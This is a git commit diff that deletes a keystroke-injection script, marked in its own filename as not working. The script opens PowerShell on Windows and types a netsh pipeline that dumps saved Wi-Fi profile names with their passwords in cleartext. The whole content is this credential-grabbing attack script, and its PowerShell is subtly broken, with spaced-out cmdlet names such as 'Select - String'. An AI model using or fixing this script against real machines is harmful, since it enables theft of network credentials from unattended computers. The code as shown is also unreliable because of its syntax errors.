d6b63b308d0e4a340ff3aed68193c3095e864614
Rusty Russian <115586896+rustyrussian@users.noreply.github.com>
2023-08-08 17:03:07 -0500

    Delete *notWorking*wifiCredsGrabWindows.js

--- customScripts/*notWorking*wifiCredsGrabWindows.js
+++
@@ -1,9 +0,0 @@
-//WiFi Creds Grabber (WINDOWS)
-
-//start Powershell
-press("GUI r");
-delay(500);
-type("powershell\n");
-delay(300);
-type("(netsh wlan show profiles) | Select - String "\: (.+)$" | % { $name=$_.Matches.Groups[1].Value.Trim(); $_ } | % {(netsh wlan show profile name = "$name" key = clear)}  | Select - String "Key Content\W +\: (.+)$" | % { $pass=$_.Matches.Groups[1].Value.Trim(); $_ } | % { [PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} | Format - Table - AutoSize");
-press("ENTER");
